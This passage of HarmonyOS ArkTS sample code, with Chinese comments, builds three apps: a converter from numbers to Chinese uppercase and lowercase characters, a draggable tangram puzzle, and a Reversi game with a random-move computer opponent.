.padding(`${this.basePadding}lpx`) .backgroundColor(Color.White) .borderRadius(10) .margin({ top: `${this.basePadding}lpx` }) .alignItems(HorizontalAlign.Start); } } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .backgroundColor(\u0026#34;#f2f3f5\u0026#34;) .align(Alignment.Top) .padding({ bottom: `${this.basePadding}lpx` }); } } Up Lower 数字转中文大小写\nohpm install @nutpi/chinese-finance-number ohpm install @nutpi/chinese-number-format // 导入必要的模块 import { promptAction } from \u0026#39;@kit.ArkUI\u0026#39;; // 用于显示提示信息 import { pasteboard } from \u0026#39;@kit.BasicServicesKit\u0026#39;; // 用于处理剪贴板操作 import { toChineseNumber } from \u0026#39;@nutpi/chinese-finance-number\u0026#39;; // 将数字转换为中文大写金额 import { toChineseWithUnits, // 将数字转换为带单位的中文 toUpperCase, // 将中文小写转换为大写 } from \u0026#39;@nutpi/chinese-number-format\u0026#39;; @Entry // 标记此组件为入口点 @Component // 定义一个组件 struct NumberToChineseConverter { @State private exampleNumber: number = 88.8; // 示例数字 @State private textColor: string = \u0026#34;#2e2e2e\u0026#34;; // 文本颜色 @State private lineColor: string = \u0026#34;#d5d5d5\u0026#34;; // 分割线颜色 @State private basePadding: number = 30; // 基础内边距 @State private chineseLowercase: string = \u0026#34;\u0026#34;; // 转换后的小写中文 @State private chineseUppercase: string = \u0026#34;\u0026#34;; // 转换后的中文大写 @State private chineseUppercaseAmount: string = \u0026#34;\u0026#34;; // 转换后的中文大写金额 @State @Watch(\u0026#39;inputChanged\u0026#39;) private inputText: string = \u0026#34;\u0026#34;; // 监听输入文本变化 // 当输入文本改变时触发的方法 inputChanged() { this.chineseLowercase = toChineseWithUnits(Number(this.inputText), \u0026#39;zh-CN\u0026#39;); // 转换为小写中文并带上单位 this.chineseUppercase = toUpperCase(this.chineseLowercase, \u0026#39;zh-CN\u0026#39;); // 将小写中文转换为大写 this.chineseUppercaseAmount = toChineseNumber(Number(this.inputText)); // 转换为大写金额 } // 复制文本到剪贴板的方法 private copyToClipboard(text: string): void { const pasteboardData = pasteboard.createData(pasteboard.MIMETYPE_TEXT_PLAIN, text); // 创建剪贴板数据 const systemPasteboard = pasteboard.getSystemPasteboard(); // 获取系统剪贴板 systemPasteboard.setData(pasteboardData); // 设置剪贴板数据 promptAction.showToast({ message: \u0026#39;已复制\u0026#39; }); // 显示复制成功的提示 } // 构建用户界面的方法 build() { Column() { // 主列容器 // 页面标题 Text(\u0026#39;数字转中文大小写\u0026#39;) .fontColor(this.textColor) // 设置字体颜色 .fontSize(18) // 设置字体大小 .width(\u0026#39;100%\u0026#39;) // 设置宽度 .height(50) // 设置高度 .textAlign(TextAlign.Center) // 文本居中对齐 .backgroundColor(Color.White) // 设置背景颜色 .shadow({ // 添加阴影效果 radius: 2, // 阴影半径 color: this.lineColor, // 阴影颜色 offsetX: 0, // X轴偏移量 offsetY: 5 // Y轴偏移量 }); Scroll() { // 滚动视图 Column() { // 内部列容器 // 工具介绍部分 Column() { Text(\u0026#39;工具介绍\u0026#39;).fontSize(20).fontWeight(600).fontColor(this.textColor); // 设置介绍文字样式 Text(\u0026#39;将数字转换为中文格式，适用于票据填写、合同文书、财务报表等多种场景。支持从最小单位“分”到最大单位“千兆”的数字转换。\u0026#39;) .textAlign(TextAlign.JUSTIFY) .fontSize(18).fontColor(this.textColor).margin({ top: `${this.basePadding / 2}lpx` }); // 设置介绍详情文字样式 } .alignItems(HorizontalAlign.Start) // 对齐方式 .width(\u0026#39;650lpx\u0026#39;) // 设置宽度 .padding(`${this.basePadding}lpx`) // 设置内边距 .margin({ top: `${this.basePadding}lpx` }) // 设置外边距 .borderRadius(10) // 设置圆角 .backgroundColor(Color.White) // 设置背景颜色 .shadow({ // 添加阴影效果 radius: 10, // 阴影半径 color: this.lineColor, // 阴影颜色 offsetX: 0, // X轴偏移量 offsetY: 0 // Y轴偏移量 }); // 输入区 Column() { Row() { // 行容器 Text(\u0026#39;示例\u0026#39;) .fontColor(\u0026#34;#5871ce\u0026#34;) // 设置字体颜色 .fontSize(18) // 设置字体大小 .padding(`${this.basePadding / 2}lpx`) // 设置内边距 .backgroundColor(\u0026#34;#f2f1fd\u0026#34;) // 设置背景颜色 .borderRadius(5) // 设置圆角 .clickEffect({ level: ClickEffectLevel.LIGHT, scale: 0.8 }) // 设置点击效果 .onClick(() =\u0026gt; { // 点击事件 this.inputText = `${this.exampleNumber}`; // 设置输入框文本为示例数字 }); Blank(); // 占位符 Text(\u0026#39;清空\u0026#39;) .fontColor(\u0026#34;#e48742\u0026#34;) // 设置字体颜色 .fontSize(18) // 设置字体大小 .padding(`${this.basePadding / 2}lpx`) // 设置内边距 .clickEffect({ level: ClickEffectLevel.LIGHT, scale: 0.8 }) // 设置点击效果 .backgroundColor(\u0026#34;#ffefe6\u0026#34;) // 设置背景颜色 .borderRadius(5) // 设置圆角 .onClick(() =\u0026gt; { // 点击事件 this.inputText = \u0026#34;\u0026#34;; // 清空输入框 }); }.height(45) // 设置高度 .justifyContent(FlexAlign.SpaceBetween) // 子元素水平分布方式 .width(\u0026#39;100%\u0026#39;); // 设置宽度 Divider().margin({ top: 5, bottom: 5 }); // 分割线 TextInput({ text: $$this.inputText, placeholder: `请输入数字，例如：${this.exampleNumber}` }) // 输入框 .width(\u0026#39;100%\u0026#39;) // 设置宽度 .fontSize(18) // 设置字体大小 .caretColor(this.textColor) // 设置光标颜色 .fontColor(this.textColor) // 设置字体颜色 .margin({ top: `${this.basePadding}lpx` }) // 设置外边距 .padding(0) // 设置内边距 .backgroundColor(Color.Transparent) // 设置背景颜色 .borderRadius(0) // 设置圆角 .type(InputType.NUMBER_DECIMAL); // 设置输入类型为数字 } .alignItems(HorizontalAlign.Start) // 对齐方式 .width(\u0026#39;650lpx\u0026#39;) // 设置宽度 .padding(`${this.basePadding}lpx`) // 设置内边距 .margin({ top: `${this.basePadding}lpx` }) // 设置外边距 .borderRadius(10) // 设置圆角 .backgroundColor(Color.White) // 设置背景颜色 .shadow({ // 添加阴影效果 radius: 10, // 阴影半径 color: this.lineColor, // 阴影颜色 offsetX: 0, // X轴偏移量 offsetY: 0 // Y轴偏移量 }); // 结果区 Column() { Row() { Text(`小写：${this.chineseLowercase}`).fontColor(this.textColor).fontSize(18).layoutWeight(1); // 显示小写结果 Text(\u0026#39;复制\u0026#39;) .fontColor(Color.White) // 设置字体颜色 .fontSize(18) // 设置字体大小 .padding(`${this.basePadding / 2}lpx`) // 设置内边距 .backgroundColor(\u0026#34;#0052d9\u0026#34;) // 设置背景颜色 .borderRadius(5) // 设置圆角 .clickEffect({ level: ClickEffectLevel.LIGHT, scale: 0.8 }) // 设置点击效果 .onClick(() =\u0026gt; { // 点击事件 this.copyToClipboard(this.chineseLowercase); // 复制小写结果到剪贴板 }); }.constraintSize({ minHeight: 45 }) // 最小高度 .justifyContent(FlexAlign.SpaceBetween) // 子元素水平分布方式 .width(\u0026#39;100%\u0026#39;); // 设置宽度 Divider().margin({ top: 5, bottom: 5 }); // 分割线 Row() { Text(`大写：${this.chineseUppercase}`).fontColor(this.textColor).fontSize(18).layoutWeight(1); // 显示大写结果 Text(\u0026#39;复制\u0026#39;) .fontColor(Color.White) // 设置字体颜色 .fontSize(18) // 设置字体大小 .padding(`${this.basePadding / 2}lpx`) // 设置内边距 .backgroundColor(\u0026#34;#0052d9\u0026#34;) // 设置背景颜色 .borderRadius(5) // 设置圆角 .clickEffect({ level: ClickEffectLevel.LIGHT, scale: 0.8 }) // 设置点击效果 .onClick(() =\u0026gt; { // 点击事件 this.copyToClipboard(this.chineseUppercase); // 复制大写结果到剪贴板 }); }.constraintSize({ minHeight: 45 }) // 最小高度 .justifyContent(FlexAlign.SpaceBetween) // 子元素水平分布方式 .width(\u0026#39;100%\u0026#39;); // 设置宽度 Divider().margin({ top: 5, bottom: 5 }); // 分割线 Row() { Text(`大写金额：${this.chineseUppercaseAmount}`).fontColor(this.textColor).fontSize(18).layoutWeight(1); // 显示大写金额结果 Text(\u0026#39;复制\u0026#39;) .fontColor(Color.White) // 设置字体颜色 .fontSize(18) // 设置字体大小 .padding(`${this.basePadding / 2}lpx`) // 设置内边距 .backgroundColor(\u0026#34;#0052d9\u0026#34;) // 设置背景颜色 .borderRadius(5) // 设置圆角 .clickEffect({ level: ClickEffectLevel.LIGHT, scale: 0.8 }) // 设置点击效果 .onClick(() =\u0026gt; { // 点击事件 this.copyToClipboard(this.chineseUppercaseAmount); // 复制大写金额结果到剪贴板 }); }.constraintSize({ minHeight: 45 }) // 最小高度 .justifyContent(FlexAlign.SpaceBetween) // 子元素水平分布方式 .width(\u0026#39;100%\u0026#39;); // 设置宽度 } .alignItems(HorizontalAlign.Start) // 对齐方式 .width(\u0026#39;650lpx\u0026#39;) // 设置宽度 .padding(`${this.basePadding}lpx`) // 设置内边距 .margin({ top: `${this.basePadding}lpx` }) // 设置外边距 .borderRadius(10) // 设置圆角 .backgroundColor(Color.White) // 设置背景颜色 .shadow({ // 添加阴影效果 radius: 10, // 阴影半径 color: this.lineColor, // 阴影颜色 offsetX: 0, // X轴偏移量 offsetY: 0 // Y轴偏移量 }); } }.scrollBar(BarState.Off).clip(false); // 关闭滚动条，不允许裁剪 } .height(\u0026#39;100%\u0026#39;) // 设置高度 .width(\u0026#39;100%\u0026#39;) // 设置宽度 .backgroundColor(\u0026#34;#f4f8fb\u0026#34;); // 设置页面背景颜色 } } Tangram 七巧板\n@ObservedV2 // 监听数据变化的装饰器 class TangramBlock { // 定义七巧板类 width: number; // 宽度 height: number; // 高度 points: Array\u0026lt;[number, number]\u0026gt;; // 点坐标数组 color: string; // 颜色 @Trace initialOffsetX: number; // 初始X偏移量 @Trace initialOffsetY: number; // 初始Y偏移量 @Trace currentOffsetX: number; // 当前X偏移量 @Trace currentOffsetY: number; // 当前Y偏移量 @Trace rotationAngle: number; // 旋转角度 @Trace flipAngle: number = 0; // 翻转角度，默认为0 @Trace rotateValue: number; // 旋转值 defaultInitialOffsetX: number; // 默认初始X偏移量 defaultInitialOffsetY: number; // 默认初始Y偏移量 defaultRotationAngle: number; // 默认旋转角度 constructor(color: string, width: number, height: number, initialOffsetX: number, initialOffsetY: number, rotationAngle: number, points: Array\u0026lt;[number, number]\u0026gt;) { this.initialOffsetX = this.currentOffsetX = this.defaultInitialOffsetX = initialOffsetX; // 初始化X偏移量 this.initialOffsetY = this.currentOffsetY = this.defaultInitialOffsetY = initialOffsetY; // 初始化Y偏移量 this.rotationAngle = this.rotateValue = this.defaultRotationAngle = rotationAngle; // 初始化旋转角度 this.color = color; // 设置颜色 this.width = width; // 设置宽度 this.height = height; // 设置高度 this.points = points; // 设置点坐标数组 } resetData() { // 重置数据方法 this.flipAngle = 0; // 重置翻转角度 this.initialOffsetX = this.currentOffsetX = this.defaultInitialOffsetX; // 重置初始X偏移量 this.initialOffsetY = this.currentOffsetY = this.defaultInitialOffsetY; // 重置初始Y偏移量 this.rotationAngle = this.rotateValue = this.defaultRotationAngle; // 重置旋转角度 } } const baseUnitLength: number = 80; // 基本单位长度 @Entry // 入口组件 @Component // 定义组件 export struct Index { // 主组件 @State selectedBlockIndex: number = -1; // 当前选中位置 @State blocks: TangramBlock[] = [// 七巧板数组 // 小直角等腰三角形 new TangramBlock(\u0026#34;#fed8e5\u0026#34;, baseUnitLength, baseUnitLength, -33.58, -58.02, 135, [[0, 0], [baseUnitLength, 0], [0, baseUnitLength]]), new TangramBlock(\u0026#34;#0a0bef\u0026#34;, baseUnitLength, baseUnitLength, 78.76, 54.15, 45, [[0, 0], [baseUnitLength, 0], [0, baseUnitLength]]), // 中直角等腰三角形 new TangramBlock(\u0026#34;#ff0d0c\u0026#34;, baseUnitLength * Math.sqrt(2), baseUnitLength * Math.sqrt(2), -33.16, -1.43, -90, [[0, 0], [baseUnitLength * Math.sqrt(2), 0], [0, baseUnitLength * Math.sqrt(2)]]), // 大直角等腰三角形 new TangramBlock(\u0026#34;#ffa60a\u0026#34;, baseUnitLength * 2, baseUnitLength * 2, 22.46, -172, -135, [[0, 0], [baseUnitLength * 2, 0], [0, baseUnitLength * 2]]), new TangramBlock(\u0026#34;#3da56a\u0026#34;, baseUnitLength * 2, baseUnitLength * 2, 135.65, -59.34, -45, [[0, 0], [baseUnitLength * 2, 0], [0, baseUnitLength * 2]]), // 正方形 new TangramBlock(\u0026#34;#ffff0b\u0026#34;, baseUnitLength, baseUnitLength, 23.07, -1.84, -45, [[0, 0], [baseUnitLength, 0], [baseUnitLength, baseUnitLength], [0, baseUnitLength]]), // 平行四边形 new TangramBlock(\u0026#34;#5e0b9b\u0026#34;, baseUnitLength * 2, baseUnitLength, -61.53, -85.97, 45, [[0, 0], [baseUnitLength, 0], [baseUnitLength * 2, baseUnitLength], [baseUnitLength, baseUnitLength]]) ]; build() { // 构建方法 Column({ space: 30 }) { // 创建垂直布局 Stack() { // 创建堆叠布局 ForEach(this.blocks, (block: TangramBlock, index: number) =\u0026gt; { // 遍历七巧板数组 Stack() { // 创建堆叠布局 Polygon({ width: block.width, height: block.height })// 绘制多边形 .points(block.points)// 设置多边形顶点坐标 .fill(block.color)// 填充颜色 .draggable(false)// 长按不可拖动 .rotate({ angle: block.rotationAngle }) // 旋转角度 } .rotate({ // 旋转 x: 0, y: 1, z: 0, angle: block.flipAngle, centerX: block.width / 2, // 中心点X坐标 centerY: block.height / 2, // 中心点Y坐标 }) .width(block.width) // 设置宽度 .height(block.height) // 设置高度 .onTouch(() =\u0026gt; { // 触摸事件 this.selectedBlockIndex = index; // 设置选中索引 }) .draggable(false) // 长按不可拖动 .translate({ x: block.initialOffsetX, y: block.initialOffsetY, z: 0 }) // 平移 .gesture( // 手势操作 PanGesture()// 拖动手势 .onActionUpdate((event: GestureEvent | undefined) =\u0026gt; { // 更新事件 if (event) { block.initialOffsetX = block.currentOffsetX + event.offsetX; // 更新X偏移量 block.initialOffsetY = block.currentOffsetY + event.offsetY; // 更新Y偏移量 } }) .onActionEnd((event: GestureEvent | undefined) =\u0026gt; { // 结束事件 if (event) { block.currentOffsetX = block.initialOffsetX; // 更新当前X偏移量 block.currentOffsetY = block.initialOffsetY; // 更新当前Y偏移量 } }) ) .zIndex(this.selectedBlockIndex == index ? 1 : 0) // 设置层级 .borderWidth(2) // 边框宽度 .borderStyle(BorderStyle.Dashed) // 边框样式 .borderColor(this.selectedBlockIndex == index ? \u0026#34;#80a8a8a8\u0026#34; : Color.Transparent) // 边框颜色 }) }.width(\u0026#39;100%\u0026#39;).height(\u0026#39;750lpx\u0026#39;) // 设置宽高 .backgroundColor(\u0026#34;#e4f2f5\u0026#34;) // 背景颜色 // 旋转角度计数器 Column({ space: 5 }) { // 创建垂直布局，设置间距 Text(`旋转角度(间隔5)`).fontColor(Color.Black) // 显示旋转角度文本，设置字体颜色 Counter() { // 创建计数器组件 Text(`${this.selectedBlockIndex != -1 ? this.blocks[this.selectedBlockIndex].rotationAngle : \u0026#39;-\u0026#39;}`)// 显示当前选中七巧板的旋转角度或占位符 .fontColor(Color.Black) // 设置字体颜色 } .width(300) // 设置计数器宽度 .onInc(() =\u0026gt; { // 增加按钮的点击事件 if (this.selectedBlockIndex != -1) { animateTo({}, () =\u0026gt; { this.blocks[this.selectedBlockIndex].rotationAngle += 5; // 增加旋转角度 }) } }).onDec(() =\u0026gt; { // 减少按钮的点击事件 if (this.selectedBlockIndex != -1) { animateTo({}, () =\u0026gt; { this.blocks[this.selectedBlockIndex].rotationAngle -= 5; // 减少旋转角度 }) } }); } // 旋转角度计数器 Column({ space: 5 }) { // 创建垂直布局，设置间距 Text(`旋转角度(间隔45)`).fontColor(Color.Black) // 显示旋转角度文本，设置字体颜色 Counter() { // 创建计数器组件 Text(`${this.selectedBlockIndex != -1 ? this.blocks[this.selectedBlockIndex].rotationAngle : \u0026#39;-\u0026#39;}`)// 显示当前选中七巧板的旋转角度或占位符 .fontColor(Color.Black) // 设置字体颜色 } .width(300) // 设置计数器宽度 .onInc(() =\u0026gt; { // 增加按钮的点击事件 if (this.selectedBlockIndex != -1) { animateTo({}, () =\u0026gt; { this.blocks[this.selectedBlockIndex].rotationAngle += 45; // 增加旋转角度 }) } }).onDec(() =\u0026gt; { // 减少按钮的点击事件 if (this.selectedBlockIndex != -1) { animateTo({}, () =\u0026gt; { this.blocks[this.selectedBlockIndex].rotationAngle -= 45; // 减少旋转角度 }) } }); } // 翻转按钮 Row() { // 创建水平布局 Button(\u0026#39;向左翻转\u0026#39;).onClick(() =\u0026gt; { // 左翻转按钮点击事件 animateTo({}, () =\u0026gt; { if (this.selectedBlockIndex != -1) { this.blocks[this.selectedBlockIndex].flipAngle -= 180; // 减少翻转角度 } }); }); Button(\u0026#39;向右翻转\u0026#39;).onClick(() =\u0026gt; { // 右翻转按钮点击事件 animateTo({}, () =\u0026gt; { if (this.selectedBlockIndex != -1) { this.blocks[this.selectedBlockIndex].flipAngle += 180; // 增加翻转角度 } }); }); }.width(\u0026#39;100%\u0026#39;).justifyContent(FlexAlign.SpaceEvenly) // 设置宽度和内容对齐方式 // 重置和隐藏边框按钮 Row() { // 创建水平布局 Button(\u0026#39;重置\u0026#39;).onClick(() =\u0026gt; { // 重置按钮点击事件 animateTo({}, () =\u0026gt; { for (let i = 0; i \u0026lt; this.blocks.length; i++) { this.blocks[i].resetData(); // 重置七巧板数据 } this.selectedBlockIndex = -1; // 重置选中索引 }); }); Button(\u0026#39;隐藏边框\u0026#39;).onClick(() =\u0026gt; { // 隐藏边框按钮点击事件 this.selectedBlockIndex = -1; // 重置选中索引 }); }.width(\u0026#39;100%\u0026#39;).justifyContent(FlexAlign.SpaceEvenly) // 设置宽度和内容对齐 }.width(\u0026#39;100%\u0026#39;).height(\u0026#39;100%\u0026#39;) } } Reversi 翻转棋（Reversi）、奥赛罗棋（Othello）、苹果棋或正反棋（Anti reversi） 黑白棋\nimport { promptAction } from \u0026#39;@kit.ArkUI\u0026#39;; // 导入用于弹出对话框的工具 @ObservedV2 class ChessCell { // 定义棋盘上的单元格类 @Trace frontVisibility: number = 0; // 单元格上的棋子状态：0表示无子, 1表示黑子，2表示白子 @Trace rotationAngle: number = 0; // 单元格卡片的旋转角度 @Trace opacity: number = 1; // 透明度 isAnimationRunning: boolean = false; // 标记动画是否正在运行 flip(time: number) { // 翻转棋子的方法 if (this.frontVisibility === 1) { // 当前是黑子，要翻转成白子 this.showWhite(time); } else if (this.frontVisibility === 2) { // 当前是白子，要翻转成黑子 this.showBlack(time); } } showBlack(animationTime: number, callback?: () =\u0026gt; void) { // 展示黑色棋子 if (this.isAnimationRunning) { // 如果已经有动画在运行，则返回 return; } this.isAnimationRunning = true; // 设置动画状态为运行中 if (animationTime == 0) { // 如果不需要动画 this.rotationAngle = 0; // 设置旋转角度为0 this.frontVisibility = 1; // 黑子 this.isAnimationRunning = false; // 设置动画状态为停止 if (callback) { // 如果有回调函数，则执行 callback(); } } animateToImmediately({ // 开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =\u0026gt; { // 动画完成后的回调 animateToImmediately({ // 再次开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =\u0026gt; { // 动画完成后的回调 this.isAnimationRunning = false; // 设置动画状态为停止 if (callback) { // 如果有回调函数，则执行 callback(); } } }, () =\u0026gt; { // 动画开始时的回调 this.frontVisibility = 1; // 看到黑色 this.rotationAngle = 0; // 设置旋转角度为0 }); } }, () =\u0026gt; { // 动画开始时的回调 this.rotationAngle = 90; // 设置旋转角度为90度 }); } showWhite(animationTime: number, callback?: () =\u0026gt; void) { // 展示白色棋子 if (this.isAnimationRunning) { // 如果已经有动画在运行，则返回 return; } this.isAnimationRunning = true; // 设置动画状态为运行中 if (animationTime == 0) { // 如果不需要动画 this.rotationAngle = 180; // 设置旋转角度为180度 this.frontVisibility = 2; // 白子 this.isAnimationRunning = false; // 设置动画状态为停止 if (callback) { // 如果有回调函数，则执行 callback(); } } animateToImmediately({ // 开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =\u0026gt; { // 动画完成后的回调 animateToImmediately({ // 再次开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =\u0026gt; { // 动画完成后的回调 this.isAnimationRunning = false; // 设置动画状态为停止 if (callback) { // 如果有回调函数，则执行 callback(); } } }, () =\u0026gt; { // 动画开始时的回调 this.frontVisibility = 2; // 看到白色 this.rotationAngle = 180; // 设置旋转角度为180度 }); } }, () =\u0026gt; { // 动画开始时的回调 this.rotationAngle = 90; // 设置旋转角度为90度 }); } showWhiteAi(animationTime: number, callback?: () =\u0026gt; void) { // 展示白色棋子 if (this.isAnimationRunning) { // 如果已经有动画在运行，则返回 return; } this.isAnimationRunning = true; // 设置动画状态为运行中 if (animationTime == 0) { // 如果不需要动画 this.rotationAngle = 180; // 设置旋转角度为180度 this.frontVisibility = 2; // 白子 this.isAnimationRunning = false; // 设置动画状态为停止 if (callback) { // 如果有回调函数，则执行 callback(); } } this.rotationAngle = 180; // 设置旋转角度为180度 this.frontVisibility = 2; // 白子 animateToImmediately({ // 开始动画 duration: animationTime * 3, // 动画持续时间 curve: Curve.EaseOut, iterations: 3, // 动画迭代次数 onFinish: () =\u0026gt; { // 动画完成后的回调 animateToImmediately({ // 再次开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =\u0026gt; { // 动画完成后的回调 this.isAnimationRunning = false; // 设置动画状态为停止 if (callback) { // 如果有回调函数，则执行 callback(); } } }, () =\u0026gt; { this.opacity = 1; }); } }, () =\u0026gt; { this.opacity = 0.2; }); } } @ObservedV2 class TileHighlight { @Trace isValidMove: boolean = false; } @Entry @Component struct OthelloGame { @State chessBoard: ChessCell[][] = []; @State cellSize: number = 70; @State cellSpacing: number = 5; @State transitionDuration: number = 200; @State @Watch(\u0026#39;currentPlayerIsBlackChanged\u0026#39;) currentPlayerIsBlack: boolean = true; // 先手，true表示黑棋 @State chessBoardSize: number = 8; // 假设棋盘大小为8×8 @State validMoveIndicators: TileHighlight [][] = [] @State isTwoPlayerMode: boolean = false; //true:双击游戏，false:单人游戏 @State isAIPlaying:boolean = false//true:AI正在下棋 currentPlayerIsBlackChanged() { setTimeout(() =\u0026gt; { const color = this.currentPlayerIsBlack ? 1 : 2; // 1是黑子，2表示白子 let hasMoves = this.hasValidMoves(color); if (!hasMoves) { let opponentHasMoves = this.hasValidMoves(!this.currentPlayerIsBlack ? 1 : 2); if (!opponentHasMoves) { const winner = this.determineWinner(); console.log(winner); promptAction.showDialog({ title: \u0026#39;游戏结束\u0026#39;, message: `${winner}`, buttons: [{ text: \u0026#39;重新开始\u0026#39;, color: \u0026#39;#ffa500\u0026#39; }] }).then(() =\u0026gt; { this.initGame(); }); } else { this.currentPlayerIsBlack = !this.currentPlayerIsBlack; // 切换下一玩家 } } else { if (!this.currentPlayerIsBlack) { // 当前是白棋, 模拟AI下棋 if (!this.isTwoPlayerMode) { setTimeout(() =\u0026gt; { this.aiPlaceRandom(); }, this.transitionDuration + 20); } } } }, this.transitionDuration + 20); } aiPlaceRandom() { let validMoves: [number, number][] = []; for (let i = 0; i \u0026lt; this.validMoveIndicators.length; i++) { for (let j = 0; j \u0026lt; this.validMoveIndicators[i].length; j++) { if (this.validMoveIndicators[i][j].isValidMove) { validMoves.push([i, j]); } } } if (validMoves.length \u0026gt; 0) { const randomMove = validMoves[Math.floor(Math.random() * validMoves.length)]; let chessCell = this.chessBoard[randomMove[0]][randomMove[1]]; this.placeChessPiece(randomMove[0], randomMove[1], chessCell) } } placeChessPiece(i: number, j: number, chessCell: ChessCell) { let reversibleTiles = this.findReversible(i, j, this.currentPlayerIsBlack ? 1 : 2); console.info(`reversibleTiles:${JSON.stringify(reversibleTiles)}`); if (reversibleTiles.length \u0026gt; 0) { if (this.currentPlayerIsBlack) { this.currentPlayerIsBlack = false; chessCell.showBlack(0); for (let i = 0; i \u0026lt; reversibleTiles.length; i++) { reversibleTiles[i].flip(this.transitionDuration); } } else { this.currentPlayerIsBlack = true; if (this.isTwoPlayerMode) { //双人游戏，无动画 chessCell.showWhite(0); for (let i = 0; i \u0026lt; reversibleTiles.length; i++) { reversibleTiles[i].flip(this.transitionDuration); } } else { //单人游戏，落子需要闪烁动画 this.isAIPlaying = true//AI 正在下棋 chessCell.showWhiteAi(this.transitionDuration, () =\u0026gt; { for (let i = 0; i \u0026lt; reversibleTiles.length; i++) { reversibleTiles[i].flip(this.transitionDuration); } this.currentPlayerIsBlackChanged() this.isAIPlaying = false//AI下完了 }); } } } } hasValidMoves(color: number) { let hasMoves = false; for (let row = 0; row \u0026lt; this.chessBoardSize; row++) { for (let col = 0; col \u0026lt; this.chessBoardSize; col++) { if (this.chessBoard[row][col].frontVisibility === 0 \u0026amp;\u0026amp; this.findReversible(row, col, color).length \u0026gt; 0) { this.validMoveIndicators[row][col].isValidMove = true; hasMoves = true; } else { this.validMoveIndicators[row][col].isValidMove = false; } } } return hasMoves; } aboutToAppear(): void { for (let i = 0; i \u0026lt; this.chessBoardSize; i++) { this.chessBoard.push([]); this.validMoveIndicators.push([]) for (let j = 0; j \u0026lt; this.chessBoardSize; j++) { this.chessBoard[i].push(new ChessCell()); this.validMoveIndicators[i].push(new TileHighlight()) } } this.initGame() } initGame() { this.currentPlayerIsBlack = true for (let i = 0; i \u0026lt; this.chessBoardSize; i++) { for (let j = 0; j \u0026lt; this.chessBoardSize; j++) { this.chessBoard[i][j].frontVisibility = 0 } } // 初始棋盘布局 this.chessBoard[3][3].frontVisibility = 2; this.chessBoard[3][4].frontVisibility = 1; this.chessBoard[4][3].frontVisibility = 1; this.chessBoard[4][4].frontVisibility = 2; this.currentPlayerIsBlackChanged(); } findReversible(row: number, col: number, color: number): ChessCell[] { let reversibleTiles: ChessCell[] = []; const directions = [ [-1, -1], // 左上 [-1, 0], // 正上 [-1, 1], // 右上 [0, -1], // 左 [0, 1], // 右 [1, -1], // 左下 [1, 0], // 正下 [1, 1]// 右下 ]; for (const direction of directions) { let foundOpposite = false; let x = row; let y = col; do { x += direction[0]; y += direction[1]; if (x \u0026lt; 0 || y \u0026lt; 0 || x \u0026gt;= this.chessBoardSize || y \u0026gt;= this.chessBoardSize) { break; } const cell = this.chessBoard[x][y]; if (cell.frontVisibility === 0) { break; } if (cell.frontVisibility === color) { if (foundOpposite) { let tempX: number = x - direction[0]; let tempY: number = y - direction[1]; while (tempX !== row || tempY !== col) { reversibleTiles.push(this.chessBoard[tempX][tempY]); tempX -= direction[0]; tempY -= direction[1]; } } break; } else { foundOpposite = true; } } while (true); } return reversibleTiles; } determineWinner(): string { let blackCount = 0; let whiteCount = 0; for (let row of this.chessBoard) { for (let cell of row) { if (cell.frontVisibility === 1) { blackCount++; } if (cell.frontVisibility === 2) { whiteCount++; } } } if (blackCount \u0026gt; whiteCount) { return \u0026#34;黑棋获胜！\u0026#34;; } if (whiteCount \u0026gt; blackCount) { return \u0026#34;白棋获胜！\u0026#34;; } return \u0026#34;平局！\u0026#34;; } hasValidMove(color: number): boolean { for (let row = 0; row \u0026lt; this.chessBoardSize; row++) { for (let col = 0; col \u0026lt; this.chessBoardSize; col++) { if (this.chessBoard[row][col].frontVisibility === 0 \u0026amp;\u0026amp; this.findReversible(row, col, color).length \u0026gt; 0) { return true; } } } return false; } build() { Column({ space: 20 }) { Row() { Row() { Text(``)// 显示单元格的值或空字符串 .width(`${this.cellSize}lpx`)// 设置宽度 .height(`${this.cellSize}lpx`)// 设置高度 .textAlign(TextAlign.Center)// 文本居中 .backgroundColor(Color.Black)// 设置背景颜色 .borderRadius(\u0026#39;50%\u0026#39;)// 设置圆角 .padding(10) Text(`黑棋行动`) .fontColor(Color.White) .padding(10) } .visibility(this.currentPlayerIsBlack ? Visibility.Visible : Visibility.Hidden) Row() { Text(`白棋行动`) .fontColor(Color.White) .padding(10) Text()// 显示单元格的值或空字符串 .width(`${this.cellSize}lpx`)// 设置宽度 .height(`${this.cellSize}lpx`)// 设置高度 .textAlign(TextAlign.Center)// 文本居中 .backgroundColor(Color.White)// 设置背景颜色 .fontColor(Color.White) .borderRadius(\u0026#39;50%\u0026#39;)// 设置圆角 .padding(10) } .visibility(!this.currentPlayerIsBlack ? Visibility.Visible : Visibility.Hidden) } .width(`${(this.cellSize + this.cellSpacing * 2) * 8}lpx`) // 设置宽度 .justifyContent(FlexAlign.SpaceBetween) .margin({ top: 20 }) Stack() { //棋盘背景 Flex({ wrap: FlexWrap.Wrap }) { ForEach(this.validMoveIndicators, (row: boolean[], _rowIndex: number) =\u0026gt; { ForEach(row, (item: TileHighlight, _colIndex: number) =\u0026gt; { Text(`${item.isValidMove ? \u0026#39;+\u0026#39; : \u0026#39;\u0026#39;}`)// 显示单元格的值或空字符串 .width(`${this.cellSize}lpx`)// 设置宽度 .height(`${this.cellSize}lpx`)// 设置高度 .margin(`${this.cellSpacing}lpx`) .fontSize(`${this.cellSize / 2}lpx`)// 设置字体大小 .fontColor(Color.White) .textAlign(TextAlign.Center)// 文本居中 .backgroundColor(Color.Gray)// 设置背景颜色 .borderRadius(2) // 设置圆角 }); }); } .width(`${(this.cellSize + this.cellSpacing * 2) * 8}lpx`) // 设置宽度 //棋子 Flex({ wrap: FlexWrap.Wrap }) { ForEach(this.chessBoard, (row: ChessCell[], rowIndex: number) =\u0026gt; { ForEach(row, (chessCell: ChessCell, colIndex: number) =\u0026gt; { Text(``)// 